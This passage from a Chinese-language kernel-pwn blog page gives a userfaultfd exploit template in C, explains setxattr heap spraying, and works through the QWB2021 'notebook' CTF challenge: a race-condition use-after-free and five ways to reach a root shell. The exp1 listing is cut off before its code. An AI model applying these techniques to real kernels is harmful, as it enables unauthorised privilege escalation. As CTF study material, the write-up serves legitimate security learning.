class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>





        <h3 id="CTF利用模板"   >
          <a href="#CTF利用模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTF利用模板" class="headerlink" title="CTF利用模板"></a>CTF利用模板</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/" >userfaultfd 的使用-ctfwiki</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//注册缺页错误处理</span></span><br><span class="line">    <span class="comment">//当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line">    <span class="comment">// pause();			//根据实际情况在这里添加处理代码，或者直接暂停或sleep</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>使用方法：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">RegisterUserfault(addr, handler);</span><br></pre></td></tr></table></div></figure>



        <h2 id="setxattr系统调用"   >
          <a href="#setxattr系统调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#setxattr系统调用" class="headerlink" title="setxattr系统调用"></a>setxattr系统调用</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/setxattr.2.html" >setxattr(2) — Linux manual page</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.onitroad.com/jc/linux/man-pages/linux/man2/fsetxattr.2.html" >SETXATTR - Linux手册页</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://duasynt.com/blog/linux-kernel-heap-spray" >Linux Kernel universal heap spray</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><code>setxattr</code>是一个linux系统调用，同时在libc中也有同名的封装函数。通过<code>setxattr()</code>可以给系统中inode（文件，目录，符号链接）设置扩展属性（name:value对）。使用示例：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* value = <span class="string">&quot;someting...&quot;</span></span><br><span class="line">setxattr(<span class="string">&quot;/exp&quot;</span>,<span class="string">&quot;bling&quot;</span>,value,<span class="number">0x20</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></div></figure>
<p>对应到内核调用路径：</p>
<p><img   src="image-20230301180427383.png?size=600" style="width: 600px;"  alt="image-20230301180427383"></p>
<p>内核<code>setxattr()</code>函数中的主要处理过程如下，根据用户态传入的size申请对应大小（0&lt;size&lt;65535）的内存空间，并将用户态数据拷贝到该空间中，退出时会释放该内存空间。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span></span><br><span class="line">setxattr(struct user_namespace *mnt_userns, struct dentry *d,</span><br><span class="line">	 <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value, <span class="keyword">size_t</span> size,</span><br><span class="line">	 <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">if</span> (size) &#123;</span><br><span class="line">		<span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)			<span class="comment">// size不能大于65535</span></span><br><span class="line">			<span class="keyword">return</span> -E2BIG;</span><br><span class="line">		kvalue = kvmalloc(size, GFP_KERNEL);		<span class="comment">// 为value申请size大小的内存空间</span></span><br><span class="line">		<span class="comment">// ...</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;	<span class="comment">// 将用户态的value内容拷贝到内核态申请的空间中</span></span><br><span class="line">			error = -EFAULT;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// ...</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">out:</span><br><span class="line">	kvfree(kvalue);		<span class="comment">// 设置完成后，退出函数前释放掉申请的内存空间</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>漏洞利用过程中有两种使用方法：</p>
<ol>
<li>结合userfaultfd，跨页面拷贝时让进程停在<code>copy_from_user</code>处。对UAF堆，相比其他结构体，setxattr可覆盖前8字节内容</li>
<li>纯粹往堆上喷数据</li>
</ol>

        <h1 id="题目1-强网杯2021-notebook"   >
          <a href="#题目1-强网杯2021-notebook" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目1-强网杯2021-notebook" class="headerlink" title="题目1 - 强网杯2021 notebook"></a>题目1 - 强网杯2021 notebook</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/#qwb2021-notebook" >QWB2021-notebook</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253835" >从强网杯 2021 线上赛题目 notebook 中浅析 userfaultfd 在 kernel pwn 中的利用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/385645268" >第五届强网杯线上赛冠军队 WriteUp - Pwn 篇</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>做这个题前，首先要了解读写锁的原理：</p>
<ul>
<li>当写锁被取走时，所有取锁操作被阻塞</li>
<li>当读锁被取走时，取写锁的操作被阻塞</li>
</ul>

        <h2 id="分析"   >
          <a href="#分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析" class="headerlink" title="分析"></a>分析</h2>
      <p>题目附件：<a href="QWB2021-notebook.zip">QWB2021-notebook.zip</a></p>
<p>先看<code>notebook.ko</code>的逻辑：</p>
<ul>
<li>noteadd（0x100）：为notebook[idx]-&gt;note申请一片size大小的空间</li>
<li>notegift（0x64）：将notebook处存放的note和size信息（256个字节）全部拷贝给用户态（信息泄露 - 泄露堆地址）</li>
<li>notedel（0x200）：free掉notebook[idx]-&gt;note对应的空间，在size不为0的情况下，清空bss段上的内容</li>
<li>noteedit（0x300）：修改notebook[idx]-&gt;note和size，逻辑有问题导致size变任意大小，并申请任意大小的堆。（这里存在条件竞争，可导致UAF）</li>
<li>mynote_read：根据传入的idx，将notebook[idx]-&gt;note内容读出。有<code>_check_object_size()</code>检查，堆和大小匹配时才能正确读出，防止堆的越界读写。</li>
<li>mynote_write：根据传入的idx，更新notebook[idx]-&gt;note的内容。也有<code>_check_object_size()</code>检查。</li>
</ul>
<p>然后看一下锁的情况，<code>noteadd()</code>和<code>noteedit()</code>中都有读锁，<code>notedel()</code>中有写锁，其他函数未使用锁。写锁设置后，读锁将被阻塞，所以<code>notedel()</code>无法条件竞争。而<code>noteadd()</code>和<code>noteedit()</code>设置了读锁，却都对notebook[idx].size有写的操作，因此条件竞争可以从它们当中构造。</p>
<p><code>noteedit()</code>函数漏洞的关键点如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">v5 = &amp;notebook[idx];</span><br><span class="line"> raw_read_lock(&amp;lock);</span><br><span class="line"> size = v5-&gt;size;</span><br><span class="line"> v5-&gt;size = newsize;                           <span class="comment">// noteboot[idx].size可以被改大</span></span><br><span class="line"> <span class="keyword">if</span> ( size == newsize )</span><br><span class="line"> &#123;</span><br><span class="line">   v8 = <span class="number">1LL</span>;</span><br><span class="line">   <span class="keyword">goto</span> editout;</span><br><span class="line"> &#125;</span><br><span class="line"> v7 = (*(__int64 (__fastcall **)(<span class="keyword">void</span> *, <span class="keyword">size_t</span>, __int64))krealloc.gap0)(v5-&gt;note, newsize, <span class="number">0x24000C0</span>LL);				<span class="comment">// krealloc会释放v5-&gt;note，但v5-&gt;note值保持不变。在更新v5-&gt;note之前，其他线程仍可访问该释放的堆块，导致UAF。只不过这个条件竞争的时间窗口很小。</span></span><br><span class="line"> copy_from_user(name, v4, <span class="number">0x100</span>LL);            <span class="comment">// 所以在这里使用userfaultfd让释放线程卡住，延长时间窗口，其他线程UAF</span></span><br><span class="line"> <span class="keyword">if</span> ( !v5-&gt;size )</span><br><span class="line"> &#123;</span><br><span class="line">   printk(<span class="string">&quot;free in fact&quot;</span>);</span><br><span class="line">   v5-&gt;note = <span class="number">0LL</span>;</span><br><span class="line">   v8 = <span class="number">0LL</span>;</span><br><span class="line">   <span class="keyword">goto</span> editout;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class="line"> &#123;</span><br><span class="line">   v5-&gt;note = (<span class="keyword">void</span> *)v7;		<span class="comment">// 更新v5-&gt;note的值</span></span><br></pre></td></tr></table></div></figure>
<p><code>noteadd()</code>函数漏洞的关键点如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v4 = v3;</span><br><span class="line">v5 = &amp;notebook[idx];</span><br><span class="line">raw_read_lock(&amp;lock);</span><br><span class="line">v6 = v5-&gt;size;</span><br><span class="line">v5-&gt;size = size;						<span class="comment">// notebook[idx]-&gt;size被设置</span></span><br><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x60</span> )                          </span><br><span class="line">&#123;</span><br><span class="line">  v5-&gt;size = v6;</span><br><span class="line">  v7 = <span class="number">-2LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;[x] Add size out of range.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;notebook[idx]-&gt;size小于<span class="number">0x60</span>，进该分支</span><br><span class="line">  copy_from_user(name, v4, <span class="number">0x100</span>LL);		<span class="comment">// notebook[idx]-&gt;size小于0x60，进该分支。可利用userfaultfd阻塞，将size改成某个小于等于0x60大小的值</span></span><br><span class="line">  <span class="keyword">if</span> ( v5-&gt;note )                           </span><br><span class="line">  &#123;</span><br><span class="line">    v5-&gt;size = v6;</span><br></pre></td></tr></table></div></figure>
<p>至此，分析的结果如下：</p>
<ol>
<li>noteadd一个内核堆块heap1</li>
<li>【新线程1】noteedit传入一个大size，使heap1被free，并通过userfaultfd使流程在copy_from_user()时停住。此时，heap1的地址还在notebook[index].note上，于是UAF就产生了。</li>
<li>【新线程2】noteadd将heap1对应的size重新改成原来的大小，并在copy_from_user()时停住。不然mynote_read和mynote_write无法正常执行。</li>
<li>在主线程中，就可以自由地对已经free掉的heap1进行自由读写操作了！</li>
</ol>
<p>如下图所示：</p>
<p><img   src="image-20230225213203420.png?size=600" style="width: 600px;"  alt="image-20230225213203420"></p>
<p>接下来就看怎么利用这个UAF读写。</p>

        <h2 id="利用"   >
          <a href="#利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用" class="headerlink" title="利用"></a>利用</h2>
      <p>利用思路：</p>
<ol>
<li>最早noteadd时指定0x20大小</li>
<li>当UAF产生并能自由读写后，使用seq_operations结构体占用heap1。个人认为这个结构体比较好用，无需另外构造函数指针列表</li>
<li>先通过mynote_read泄露<code>seq_operations-&gt;start</code>函数指针</li>
<li>再通过mynote_write改写<code>seq_operations-&gt;start</code>函数指针，实现控制流劫持</li>
<li>控制流劫持后，利用内核ROP（notegift泄露堆地址）栈迁移到堆，继续ROP利用</li>
</ol>
<p>这里列出四种get root shell的方式</p>
<ul>
<li><p>modprobe_path - <strong>exp1</strong></p>
<p>1）使用prepare()模板，做好准备工作（<code>/tmp/x</code>, <code>/tmp/dummy</code>, <code>/bin/umount</code>），fork()子进程</p>
<p>2）子进程将modprobe_path改成<code>/tmp/x</code></p>
<p>3）父进程等待一段时间后，执行<code>/tmp/dummy</code>，回shell。</p>
<p>4）再exit即可获得root shell</p>
</li>
<li><p>KPTI trampoline - <strong>exp2</strong></p>
<p>1）执行commit_creds(prepare_cred(0))</p>
<p>2）利用swapgs_restore_regs_and_return_to_usermode()设置CR3，安全返回用户态</p>
<p>3）getshell被执行</p>
</li>
<li><p>signal handler - <strong>exp3</strong></p>
<p>1）用户态注册signal(SIGSEGV,getshell)</p>
<p>2）执行commit_creds(prepare_cred(0))</p>
<p>3）swapgs和iretq返回用户态时触发SIGSEGV</p>
<p>4）getshell被执行</p>
</li>
<li><p>tty_struct + work_for_cpu_fn() - <strong>exp4</strong></p>
<p>1）先构造一个0x3a8（kmalloc-1024）大小的UAF堆块heap1</p>
<p>2）通过<code>open(&quot;dev/ptmx&quot;,2); </code>取回heap1，于是我们就可以控制tty_struct的内容</p>
<p>2）再构造一个任意大小（0x100）的堆块heap2，用来存放构造的tty_operations，更改ioctl函数指针</p>
<p>3）读取heap1的内容，更改0x18偏移处指向heap2。更改0x20（prepare_kernel_creds）和0x28（参数0）处的值，并保存0x30（ldisc_sem）处的值为old_value。最后将以上内容写回heap1。</p>
<p>4）调用ioctl，内核将执行prepare_kernel_creds(0) </p>
<p>5）读取heap1的内容，返回值pkc_ret在0x30处，更改0x20（commit_creds）和0x28（pkc_value）处的值，并更改0x30（ldisc_sem）处的值为old_value。最后将以上内容写回heap1。</p>
<p>6）调用ioctl，内核将执行commit_creds(pkc_ret)</p>
<p>7）用户态执行system(“/bin/sh”)，即可获得root shell</p>
</li>
<li><p>leak heap cookie + modprobe_path - <strong>exp5</strong></p>
<p>这个巧妙的利用方法来源：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf.njupt.edu.cn/archives/627#notebook" >强网杯2021 Writeup by X1cT34m</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>利用方法的描述参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.imv1.me/2021/07/01/qwb2021-notebook-kernel-race-condition.md/" >从强网杯 Notebook 看内核条件竞争</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">该方法不需要内核ROP，巧妙利用了slub的控制字节（freelist 单向链表，类似 fastbin）。</span><br><span class="line">	1. 分配两个 0x60 的块，分别为 chunk1, chunk2。</span><br><span class="line">	2. 通过 gift 读出 chunk1 和 chunk2 的地址。</span><br><span class="line">	3. free (chunk2) , free (chunk1)，此时 freelist -&gt; chunk1 -&gt; chunk2</span><br><span class="line">	4. 再次分配 chunk1 和 chunk2，通过 gift 确保和上次分配的是同两个块。	</span><br><span class="line">	5. 此时读出 chunk1 的前 8 字节，这 8 字节应为 cookie ^ chunk1_addr ^ chunk2_addr（详见 Kirin）。这样就能泄露出 cookie。</span><br><span class="line">	6. 重新开始，构造UAF，使chunk1被free，但堆地址还在notebook[0]上。</span><br><span class="line">	7. 向被 free 掉的 chunk1 中写入构造好的内容。此时我们写入 8 字节 cookie ^ chunk1_addr ^ notebook_addr-0x10 即可将 freelist 链改为 freelist -&gt; chunk1 -&gt; notebook_addr - 0x10。（但此时 freelist 链并不合法）</span><br><span class="line">	8. 由于 name 在 bss 上的位置正好在 notebook 的前面，所以可以将 note_addr - 0x10 的地方写为 cookie ^ notebook_addr - 0x10 ^ 0，这样 freelist 链就合法了。</span><br><span class="line">	9. 现在 notebook 可控，就能拿到任意地址读写的权力了。通过 notebook.ko 调用内核函数的地方泄露内核基地址，然后改写 modprobe_path 来提权。</span><br></pre></td></tr></table></div></figure>




</li>
</ul>

        <h3 id="exp1"   >
          <a href="#exp1" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3>
      <blockquote>
<p>利用modprobe_path改umount，exit退出系统时获得root shell</p>
</blockquote>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span 